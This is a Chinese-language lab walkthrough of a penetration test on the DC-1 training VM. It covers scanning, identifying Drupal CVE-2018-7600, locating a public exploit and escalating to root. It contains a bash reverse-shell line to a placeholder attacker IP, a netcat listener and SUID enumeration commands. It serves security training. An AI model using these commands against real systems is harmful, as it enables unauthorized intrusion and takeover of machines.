# DC1 靶机渗透测试实战

> 靶机：DC-1
> 类型：Linux靶机
> 实验环境：VMware 虚拟机
> 目标：从主机发现开始，完成信息收集、漏洞发现、漏洞验证、漏洞利用、获取 Shell、提权。

## 1. 主机发现

首先确认靶机是否与 Kali 处于同一网段。

查看 Kali 当前 IP：

```
ip add
```

使用 Nmap 对当前网段进行主机发现：

```
nmap -sn 172.20.10.0/24
```

发现目标主机：

```
172.20.10.2
```

后续将该 IP 作为目标靶机 IP。

> **目的：** 确定目标主机是否在线以及目标 IP。

<img src=".\images\01.png" alt="主机发现" style="zoom:33%;" />

## 2. 端口扫描

对目标主机进行端口扫描：

```
nmap 172.20.10.2
```

进一步进行详细扫描：

```
nmap -sC -sV 172.20.10.2
```

扫描结果：

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
...
```

重点关注：

- 开放端口
- 服务名称
- 服务版本
- Web 服务
- SSH 等远程服务

> **目的：** 确定目标开放的服务，为后续漏洞分析提供依据。

<img src=".\images\02.png" alt="主机发现" style="zoom:33%;" />

## 3. Web 指纹信息收集

访问：

```
http://172.20.10.2
```

观察网站页面、框架以及版本信息。

使用 Nmap Web 脚本进一步识别：

```
nmap -sV --script=http-title,http-headers 192.168.1.X
```

也可以使用浏览器开发者工具查看：

- Server
- X-Powered-By
- Cookie
- 页面源码
- JS 文件
- 网站框架

### 发现

目标 Web 服务使用：

```
Drupal
```

进一步记录 Drupal 的具体版本。

> **目的：** 判断 Web 技术栈以及可能存在的已知漏洞。

<img src=".\images\03.png" alt="主机发现" style="zoom:33%;" />

<img src=".\images\04.png" alt="主机发现" style="zoom:33%;" />

## 4. 敏感路径扫描

使用目录扫描工具寻找隐藏目录和文件：

```
dirsearch -u http://172.20.10.2
```

或者：

```
gobuster dir -u http://172.20.10.2 -w /usr/share/wordlists/dirb/common.txt
```

重点关注：

```
/admin
/login
/includes
/modules
/sites
/robots.txt
```

同时访问：

```
http://172.20.10.2/robots.txt
```

记录发现的敏感路径。

> **目的：** 寻找后台、配置文件、备份文件、插件目录等可能包含漏洞信息的资源。

<img src=".\images\05.png" alt="主机发现" style="zoom:33%;" />

## 5. 漏洞扫描

结合前面收集到的：

- Web 服务
- CMS 类型
- CMS 版本
- 开放端口
- 服务版本

进行漏洞分析。

可以使用：

```
nmap --script vuln 172.20.10.2
```

也可以使用：

```
Nuclei
Nessus
OpenVAS
```

进行进一步扫描。

### OpenVAS

| 序号 | Vuln                                                         |
| ---- | ------------------------------------------------------------ |
| 1    | Drupal Core SQL Injection Vulnerability CVE-2014-3704        |
| 2    | Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) (Active Check)CVE-2018-7600 |
| 3    | Sensitive File Disclosure (HTTP)                             |
| 4    | Cleartext Transmission of Sensitive Information via HTTP     |
| 5    | SSH Weak Encryption Algorithms Supported                     |

### AWVS

| 序号 | Vuln                                                         |
| ---- | ------------------------------------------------------------ |
| 1    | Drupal Remote Code Execution (SA-CORE-2018-002) CVE-2018-7600 |
| 2    | XML quadratic blowup denial of service attack                |
| 3    | HTML form without CSRF protection                            |
| 4    | User credentials are sent in clear text                      |
| 5    | Vulnerable Javascript library                                |

### Xray

| 序号 | Vuln                                      |
| ---- | ----------------------------------------- |
| 1    | poc-yaml-drupal-cve-2018-7600-rce/default |

### 漏洞发现

根据扫描结果以及目标 Drupal 版本，发现目标可能存在：

```
CVE-2018-7600
```

漏洞。

此时先不要直接利用，需要进行漏洞验证。

## 6. 漏洞验证

首先确认目标 Drupal 版本以及漏洞影响范围。

搜索：

```
Drupal CVE-2018-7600
```

结合漏洞公告、Exploit-DB、GitHub 等资料确认漏洞利用条件。

### 验证思路

目标：

```
Drupal
```

漏洞：

```
CVE-2018-7600
```

漏洞类型：

```
远程代码执行（RCE）
```

如果能够通过漏洞使目标执行指定命令，即可证明漏洞存在。

例如验证：

```
id
```

观察目标是否返回：

```
uid=...
gid=...
```

> **注意：** 漏洞扫描工具发现 CVE ≠ 漏洞一定可以利用，因此需要单独进行验证。

<img src=".\images\08.png" alt="主机发现" style="zoom:33%;" />

<img src=".\images\09.png" alt="主机发现" style="zoom:33%;" />

<img src=".\images\09.png" alt="主机发现" style="zoom:33%;" />

## 7. 漏洞利用

确认目标存在：

```
CVE-2018-7600
```

之后寻找对应 Exploit。

可以通过：

```
searchsploit
Exploit-DB
GitHub
Metasploit
```

查询公开的漏洞利用代码。

例如：

```
searchsploit Drupal 7
```

找到对应 Exploit 后，根据目标环境修改：

```
Target IP
Target Port
Payload
监听地址
监听端口
```

然后执行漏洞利用。

<img src=".\images\10.png" alt="主机发现" style="zoom:33%;" />

## 8. 获取 Shell

漏洞利用成功后，目标能够执行命令。

首先确认当前权限：

```
whoami
```

查看系统信息：

```
uname -a
```

查看当前目录：

```
pwd
```

查看当前用户：

```
id
```

如果只能执行单条命令，则进一步尝试获取稳定 Shell。

<img src=".\images\11.png" alt="主机发现" style="zoom:33%;" />

## 9. 反弹 Shell

在 Kali 上监听端口：

```
nc -lvnp 5555
```

目标机执行反弹 Shell Payload。

例如：

```
bash -i >& /dev/tcp/攻击机IP/5555 0>&1
```

Kali 收到连接后：

```
whoami
```

确认已经获得目标 Shell。

<img src=".\images\12.png" alt="主机发现" style="zoom:33%;" />

### Shell 稳定化

如果获得的是比较简陋的 Shell，可以尝试：

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

然后进一步改善终端交互体验。

> **目的：** 将漏洞利用得到的命令执行能力转换为可交互的 Shell。

## 10. 权限提升

获得普通用户权限后，开始进行权限提升。

首先查看当前权限：

```
id
```

查看当前用户：

```
sudo -l
```

查看系统版本：

```
uname -a
```

查看 SUID：

```
find / -perm -4000 -type f 2>/dev/null
```

查看定时任务：

```
cat /etc/crontab
```

查看当前用户能够访问的敏感文件：

```
find / -writable -type f 2>/dev/null
```

### 提权分析

根据目标系统环境，依次检查：

```
sudo 配置
↓
SUID
↓
定时任务
↓
文件权限
↓
服务配置
↓
内核漏洞
```

最终获得：

```
root
```

权限。

验证：

```
whoami
```

返回：

```
root
```

说明提权成功。

<img src=".\images\13.png" alt="主机发现" style="zoom:33%;" />

# 11. 完整攻击链

本次 DC1 的整体思路：

```
主机发现
    ↓
发现目标 IP
    ↓
端口扫描
    ↓
发现 HTTP 服务
    ↓
Web 指纹识别
    ↓
确定 Drupal
    ↓
敏感路径扫描
    ↓
确定 Drupal 版本
    ↓
漏洞扫描
    ↓
发现 CVE-2018-7600
    ↓
漏洞验证
    ↓
确认 RCE
    ↓
寻找公开 Exploit
    ↓
漏洞利用
    ↓
命令执行
    ↓
反弹 Shell
    ↓
获得普通用户权限
    ↓
权限提升
    ↓
获得 root 权限
```

# 12. 本次实战使用工具

| 阶段     | 工具                            |
| -------- | ------------------------------- |
| 主机发现 | Nmap                            |
| 端口扫描 | Nmap                            |
| Web 指纹 | Nmap / 浏览器                   |
| 敏感路径 | Dirsearch / Gobuster/Bp         |
| 漏洞扫描 | Nmap / Nuclei/Openvas/Awvs/xray |
| 漏洞搜索 | Searchsploit / Exploit-DB       |
| 漏洞利用 | Exploit                         |
| Shell    | Netcat                          |
| 权限提升 | Linux 原生命令                  |

# 13. 实战总结

这次 DC1 主要练习了一套完整的 Web 渗透流程：

```
发现目标 → 信息收集 → 漏洞发现 → 漏洞验证
→ 漏洞利用 → 获取 Shell → 权限提升
```

重点不是单独记住某一个 Payload，而是掌握：

1. **发现目标**
2. **确定开放服务**
3. **识别 Web 技术栈**
4. **根据版本寻找漏洞**
5. **验证漏洞是否真实存在**
6. **寻找公开 Exploit**
7. **利用漏洞获得命令执行**
8. **获取稳定 Shell**
9. **分析当前权限**
10. **完成提权**